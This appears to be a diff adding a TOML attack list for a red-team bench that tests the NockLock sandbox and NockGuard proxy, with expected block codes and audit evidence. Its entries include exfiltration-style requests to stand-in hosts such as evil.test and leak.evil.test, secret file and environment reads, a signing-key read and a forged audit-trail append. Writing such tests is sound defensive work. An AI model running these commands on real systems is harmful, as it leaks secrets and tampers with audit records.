@@ -1,0 +1,222 @@
+# Scripted attack list for the NockLock + NockGuard red-team bench (N11623).
+#
+# Every entry runs as `/bin/sh -c <cmd>` inside its own `nocklock wrap
+# --net-fence=netns` session. The exit status of cmd is the verdict: 0 means the
+# attack GOT WHAT IT WANTED (breach), non-zero means it was stopped. The two
+# controls flip that: they must exit 0 and be logged as allowed.
+#
+# blocked_exit = [..]    -> the exit codes that mean this attack was stopped (curl 35 = TLS handshake
+#                             refused, 22 = proxy 4xx, ...). Any other non-zero exit, such as a crashed
+#                             client's own 1, is a HARNESS-FAULT that fails the run, never a block.
+#                             The python attacks exit 42 on a refused connection and catch OSError, so
+#                             an uncaught exception (exit 1) is a fault, not a block.
+#
+# Placeholders: @WORK@ (bench scratch dir), @BIN@ (dir with the MCP client), @SINK@ (host UDP receiver on port 53; a datagram there is an escape), @KEY@ and @TRAIL@ (NockGuard signing key and signed trail, outside every grant).
+#
+# Proof fields name the signed row that must exist for the attempt:
+#   host = true            -> the attack runs on the host, outside the fence, directly
+#                             against `nockguard proxy` (tool = the tools/call name). The
+#                             proof is NockGuard's signed policy deny; the fence adds
+#                             nothing to it, and the report labels the row "NockGuard (host)".
+#   evidence = "nocklock"  -> a row in the NockLock Ed25519 audit chain
+#   evidence = "nockguard" -> an entry in the NockGuard Ed25519 audit trail
+#   event / rule / match   -> event type, a substring of the row's rule text,
+#                             and an optional substring naming the target.
+#   floor = true           -> the kernel floor (netns default-drop)
+#                             stops the attempt before any proxy sees it, so
+#                             NockLock writes no per-attempt row today. The
+#                             pinned row is the session's signed fence-state row
+#                             proving that floor was armed. Reported as such. The same
+#                             command also runs once OUTSIDE `nocklock wrap` as
+#                             a control; if that does not exit 0 (reach), the
+#                             attack is INCONCLUSIVE, not a pass.
+
+[[attack]]
+id = "egress-https-offlist"
+class = "off-allowlist-https"
+cmd = "curl -fsS -m 10 -o /dev/null https://evil.test/"
+expect = "blocked"
+blocked_exit = [35]
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_sni"
+match = "host=evil.test:443"
+
+[[attack]]
+id = "egress-http-offlist"
+class = "off-allowlist-http"
+cmd = "curl -fsS -m 10 -o /dev/null http://evil.test/"
+expect = "blocked"
+blocked_exit = [22]
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_host"
+match = "host=evil.test:80"
+
+[[attack]]
+id = "raw-socket-tcp-handrolled"
+class = "raw-socket"
+cmd = '''python3 -c "
+import socket, sys
+try:
+    s = socket.create_connection((socket.gethostbyname('evil.test'), 443), 5)
+    s.send(b'\x16\x03\x01not-a-real-handshake')
+    s.settimeout(5)
+    data = s.recv(100)
+except OSError:
+    data = b''
+sys.exit(0 if data[:1] in (b'\x15', b'\x16') else 42)"'''
+expect = "blocked"
+blocked_exit = [42]
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_sni"
+match = "host=:443"
+
+[[attack]]
+id = "tcp-direct-public-ip"
+class = "raw-socket"
+cmd = '''python3 -c "
+import socket, sys
+try:
+    socket.create_connection(('1.1.1.1', 443), 5)
+except OSError:
+    sys.exit(42)"'''
+expect = "blocked"
+blocked_exit = [42]
+floor = true
+evidence = "nocklock"
+event = "network_passed"
+rule = "egress level=KERNEL netns"
+
+[[attack]]
+id = "dns-direct-resolver"
+class = "direct-dns-query"
+cmd = '''python3 -c "
+import socket, sys
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(3)
+q = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
+host, port = '@SINK@'.rsplit(':', 1)
+try:
+    s.sendto(q, (host, int(port)))
+    s.recvfrom(512)
+except OSError:
+    sys.exit(42)
+sys.exit(0)"'''
+expect = "blocked"
+blocked_exit = [42]
+floor = true
+evidence = "nocklock"
+event = "network_passed"
+rule = "egress level=KERNEL netns"
+
+[[attack]]
+id = "dns-exfil-via-stub"
+class = "direct-dns-query"
+cmd = '''python3 -c "
+import socket, sys
+try:
+    s = socket.create_connection((socket.gethostbyname('leak.evil.test'), 80), 5)
+    s.send(b'GET /?d=leaked HTTP/1.0\r\nHost: leak.evil.test\r\n\r\n')
+    s.settimeout(5)
+    reply = s.recv(100)
+except OSError:
+    reply = b''
+sys.exit(0 if reply.startswith(b'HTTP/1.1 200') else 42)"'''
+expect = "blocked"
+blocked_exit = [42]
+evidence = "nocklock"
+event = "network_blocked"
+rule = "rule=disallowed_host"
+match = "host=leak.evil.test:80"
+
+[[attack]]
+id = "secret-file-read"
+class = "secret-file-read"
+cmd = "cat @WORK@/outside/canary.txt"
+expect = "blocked"
+blocked_exit = [1]
+evidence = "nocklock"
+event = "file_blocked"
+rule = "reason=outside allowed directory"
+match = "canary.txt"
+
+[[attack]]
+id = "secret-env-read"
+class = "secret-env-read"
+cmd = 'test -n "$BENCH_SECRET_TOKEN"'
+expect = "blocked"
+blocked_exit = [1]
+evidence = "nocklock"
+event = "secret_blocked"
+rule = "BENCH_SECRET_TOKEN"
+
+[[attack]]
+id = "write-outside-root"
+class = "write-outside-fence-root"
+cmd = "echo x > @WORK@/outside/planted.txt"
+expect = "blocked"
+blocked_exit = [2]
+absent = "@WORK@/outside/planted.txt"
+evidence = "nocklock"
+event = "file_blocked"
+rule = "reason=outside allowed directory"
+match = "planted.txt"
+
+[[attack]]
+id = "mcp-tools-call-denied"
+class = "mcp-denied-tool"
+cmd = '''python3 @BIN@/mcp_client.py files_delete'''
+expect = "blocked"
+blocked_exit = [1]
+evidence = "nockguard"
+host = true
+tool = "files_delete"
+decision = "deny"
+rule = 'deny-rule "*delete*"'
+
+[[attack]]
+id = "nockguard-key-read"
+class = "evidence-key-read"
+cmd = "cat @KEY@"
+expect = "blocked"
+blocked_exit = [1]
+evidence = "nocklock"
+event = "file_blocked"
+rule = "reason=outside allowed directory"
+match = ".nockguard/keys"
+
+[[attack]]
+id = "nockguard-trail-append"
+class = "evidence-trail-write"
+cmd = "echo forged >> @TRAIL@"
+expect = "blocked"
+blocked_exit = [2]
+evidence = "nocklock"
+event = "file_blocked"
+rule = "reason=outside allowed directory"
+match = "bench.audit.jsonl"
+
+# Negative controls: allowed actions must succeed and be logged as allowed. A
+# bench that blocks everything proves nothing.
+[[attack]]
+id = "control-egress-allowlisted"
+class = "negative-control"
+cmd = "curl -fsS -m 20 -o /dev/null https://example.com/"
+expect = "allowed"
+evidence = "nocklock"
+event = "network_passed"
+rule = "rule=allowlisted"
+match = "host=example.com:443"
+
+[[attack]]
+id = "control-mcp-allowed-tool"
+class = "negative-control"
+cmd = '''python3 @BIN@/mcp_client.py docs_get'''
+expect = "allowed"
+evidence = "nockguard"
+host = true
+tool = "docs_get"
+decision = "allow"
+rule = 'allow-rule "docs_get"'
